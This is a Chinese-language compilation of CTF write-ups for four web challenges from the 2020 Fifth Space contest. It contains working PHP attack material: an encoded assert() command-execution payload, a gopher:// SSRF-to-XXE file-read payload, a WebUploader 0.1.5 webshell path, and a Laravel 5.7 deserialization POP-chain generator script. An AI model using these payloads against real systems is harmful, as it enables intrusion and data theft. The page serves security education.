---
title: 2020 第五空间智能安全大赛 Web 方向题解汇总
description: 汇总 2020 年第五空间智能安全大赛 Web 方向四道题目的详细解题过程，涵盖 PHP assert() RCE 绕过、SSRF 结合
  XXE 绕过过滤、PHP 反序列化不可见字符利用、WebUploader 0.1.5 任意文件上传 RCE 及 Laravel 5.7 POP 链构造等核心技术。
category: ai-security
tags:
- CTF
- Writeup
- 第五空间
- PHP
- SSRF
- XXE
- 反序列化
- Laravel
- POP链
- WebUploader
- 2020年
date: '2020-12-01'
updated: '2026-11-12'
---
## 概述

本页面整理自 2020 年“第五空间”智能安全大赛 Web 方向官方 Writeup，记录了四道代表性题目的攻击链构造细节。题目涉及的核心知识点包括：`assert()` 代码执行绕过正则黑名单、SSRF 打内网 XXE 绕过关键字过滤、PHP 反序列化利用 Unicode 不可见字符绕过参数名校验、WebUploader 0.1.5 组件漏洞利用、以及 Laravel 5.7 框架下自定义 POP 链挖掘与构造。

## 题目列表

| 题目名称 | 核心技术点 | 难度评价 |
|----------|------------|----------|
| hate-php | PHP assert RCE、字符串取反绕过正则 | 入门 |
| do you know | SSRF (gopher) + XXE 绕过过滤、PHP 反序列化不可见字符、任意文件读取 | 中等 |
| 美团外卖 | SQL 注入 (sqlmap)、WebUploader 0.1.5 RCE、后门利用 | 中等 |
| laravel | Laravel 5.7 反序列化 POP 链挖掘 (ImportConfigurator → Faker\Generator) | 硬核 |

---

## 0x01 hate-php —— `assert()` RCE 与字符串取反绕过

### 代码逻辑
```php
$code = $_GET['code'];
if (preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i', $code)) {
    die('You are too good for me');
}
$blacklist = get_defined_functions()['internal'];
foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/im', $code)) {
        die('You deserve better');
    }
}
assert($code);
```
- 双层黑名单：首层过滤敏感字符（flag、函数名关键字、符号等），次层遍历所有内部函数名过滤。
- 核心利用点：`assert()` 接收字符串参数时会执行代码。

### 绕过技巧：字符串取反 (`~`)
利用 PHP 位取反操作符 `~` 生成不含黑名单字符的恶意代码字符串。
```php
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)
```
- 第一部分取反得 `system`，第二部分取反得命令字符串（如 `cat /flag`）。
- 由于取反后字符均为高位字节，可绕过正则与函数名黑名单。

> **关联技术**：PHP 弱类型与字符串操作绕过 WAF 是 Web 攻防常见手法，类似思路见 [[mtctf-2021-web-writeup]] 中的黑名单绕过章节。

---

## 0x02 do you know —— SSRF + XXE + 反序列化不可见字符

### 攻击链总览
1. **入口**：`index.php` 通过 `curl` 发起请求，可控 `$url` 参数 → **SSRF**。
2. **内网目标**：`xxe.php` 仅允许 `127.0.0.1` 访问，且存在 **XXE** 漏洞（`libxml_disable_entity_loader(false)` + `LIBXML_NOENT`）。
3. **过滤绕过**：`xxe.php` 对 `file`、`flag` 等关键字过滤，采用 **双写/复写** 绕过（如 `fireadle` → 替换后仍含 `file`）。
4. **协议构造**：使用 `gopher://` 协议封装 POST 请求，向 `xxe.php` 发送 XXE Payload 读取 `hints.php` 与 `main.php`。
5. **反序列化入口**：`main.php` 中 `unserialize($_GET['⁠'])`，参数名含不可见 Unicode 字符 `%E2%80%AC` (U+202C) 与 `%E2%80%AD` (U+202D)。
6. **意外捷径**：XXE 已具备任意文件读取能力，直接读取 `flag.php` 即可，无需构造 POP 链。

### 关键 Payload 片段
```text
gopher://127.0.0.1:80/_POST /xxe.php HTTP/1.1%250d%250aHost:127.0.0.1:80%250d%250aContent-Type:application/x-www-form-urlencoded%250d%250aContent-Length:149%250d%250a%250d%250adata=<%253fxml%2bversion%2b%253d%2b"1.0"%253f><!DOCTYPE%2bANY%2b[%2b%2b%2b%2b<!ENTITY%2bf%2bSYSdtdTEM%2b"php://filter/rereadad=convert.base64-encode/resource=flxxeag.php">]><x>%252526f;</x>
```
- 双层 URL 编码（`%25` → `%`）适配 `gopher` 与 `curl` 双重解码。
- `SYSdtdTEM`、`rereadad` 利用双写绕过 `SYSTEM`、`read` 过滤。

### 不可见字符利用
- Win10 计算器复制数字时会在首尾添加 U+202A/U+202C 等格式控制字符。
- 实测 `?%E2%80%AC=123` 可被 `$_GET['⁠']` 接收，配合 `unserialize()` 触发反序列化。

> **关联技术**：
> - SSRF 打内网 XXE 模式参考 [[java-urlconnection-ssrf-protocol-bypass]] 中的协议绕过思路（虽为 Java 环境但原理相通）。
> - PHP 反序列化基础可参考 [[mtctf-2021-web-writeup]] 与 [[tctf-2021-1linephp-zip-include]] 中的利用链分析。

---

## 0x03 美团外卖 —— CMS 审计 + WebUploader 0.1.5 RCE

### 利用路径
1. **敏感文件泄露**：`www.zip` 源码包下载。
2. **SQL 注入**：`daochu.php` 拼接 SQL 无过滤 → `sqlmap` 拿管理员账密。
3. **逻辑绕过**：登录需 `id>0`，普通账号无法满足；发现提示目录 `/956c110ef9decdd920249f5fed9e4427/` 下存在 `lib/webuploader/0.1.5/`。
4. **组件漏洞**：WebUploader 0.1.5 任意文件上传（CVE 级漏洞，参考 [jas502n/webuploader-0.1.15-Demo](https://github.com/jas502n/webuploader-0.1.15-Demo)）。
5. **后门利用**：上传 Webshell 后，直接访问返回的后门路径读取 `/flag`。

### 关键路径
```text
http://target/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag
```

> **关联技术**：组件已知漏洞利用是实战渗透核心技能，类似思路见 [[ecshop-414-sql-injection-analysis]] 中的 CMS 审计流程。

---

## 0x04 laravel —— Laravel 5.7 自定义 POP 链构造

### 题目环境
- 仅暴露一个反序列化入口：`unserialize($_GET['p'])`。
- 框架版本：Laravel 5.7。
- 出题人移除了常见入口类 `PendingBroadcast`、`PendingCommand` 的 `__destruct` 逻辑。

### POP 链挖掘过程
1. **入口点筛选**：全局搜索 `__destruct`，定位到 `Symfony\Component\Routing\Loader\Configurator\ImportConfigurator`：
   ```php
   public function __destruct() {
       $this->parent->addCollection($this->route);
   }
   ```
   - `$this->parent` 与 `$this->route` 可控，需找可触发 `addCollection` 的 `__call` 魔术方法。
2. **魔术方法链接**：发现 `Faker\Generator`：
   ```php
   public function __call($method, $attributes) {
       return $this->format($method, $attributes);
   }
   public function format($formatter, $arguments = []) {
       return call_user_func_array($this->getFormatter($formatter), $arguments);
   }
   ```
   - `$this->formatters['addCollection'] = 'system'` 可实现任意命令执行。
3. **链条串联**：
   ```
   ImportConfigurator::__destruct()
       → $this->parent (Faker\Generator) ->addCollection($this->route)
       → Faker\Generator::__call('addCollection', [$route])
       → format('addCollection', [$route])
       → call_user_func_array('system', ['cat /flag'])
   ```

### EXP 生成脚本
```php
namespace Symfony\Component\Routing\Loader\Configurator {
    class ImportConfigurator {
        private $parent;
        public function __construct($parent, $route) {
            $this->parent = $parent;
            $this->route  = $route;
        }
    }
}
namespace Faker {
    class Generator {
        protected $providers = [];
        protected $formatters = [];
        public function __construct($formatters) {
            $this->formatters = $formatters;
        }
    }
}
namespace {
    $a = new Faker\Generator(['addCollection' => 'system']);
    $b = new Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a, 'cat /flag');
    echo urlencode(serialize($b));
}
```

> **关联技术**：
> - PHP 反序列化 POP 链挖掘方法论与 [[java-deserialization-fundamentals]] 中的 Java 链挖掘思路异曲同工。
> - Laravel 反序列化历史漏洞可参考 [[spring-boot-devtools-deserialization-rce]] 中的 Spring Boot DevTools 弱密钥反序列化案例（框架不同但利用核心均为反序列化入口+工具链）。

---

## 0x05 知识点总结与延伸

| 技术点 | 本文实战体现 | 进阶学习方向 |
|--------|--------------|--------------|
| `assert()`/`eval()` 代码执行绕过 | 字符串取反、编码变形 | PHP 禁用函数绕过、动态函数调用 |
| SSRF 协议利用 | `gopher://` 封装 HTTP POST | `dict://`、`file://`、`phar://` 等协议攻击面 |
| XXE 过滤绕过 | 双写、参数实体、PHP 伪协议 | 基于 DTD 的外带数据、Blind XXE |
| PHP 反序列化 | 不可见字符参数名、POP 链构造 | `phar://` 反序列化、Session 反序列化、__unserialize() 利用 |
| 组件已知漏洞利用 | WebUploader 0.1.5 上传 RCE | 常见 CMS/框架组件漏洞库维护、自动化扫描 |
| 框架 POP 链挖掘 | Laravel 5.7 自定义链 | Symfony、ThinkPHP、CodeIgniter 等主流框架链积累 |

---

## 参考资源
- WebUploader 0.1.5 漏洞复现仓库：<https://github.com/jas502n/webuploader-0.1.15-Demo>
- PHP 字符串取反绕过技巧：`~` 运算符配合 URL 编码
- Unicode 格式控制字符：U+202A (LRE)、U+202C (PDF)、U+202D (RLO) 等
- Laravel 反序列化历史漏洞：CVE-2018-15133 (5.5/5.6)、CVE-2019-9081 (5.7/5.8) 等

> **提示**：本页面聚焦于比赛题解复盘，实战中请严格遵守法律法规与授权范围，仅在合法授权环境下进行漏洞验证与研究。

## 来源

- [0th3rs安全团队-201911-202204_060](../sources/0th3rs安全团队-201911-202204_060.md)
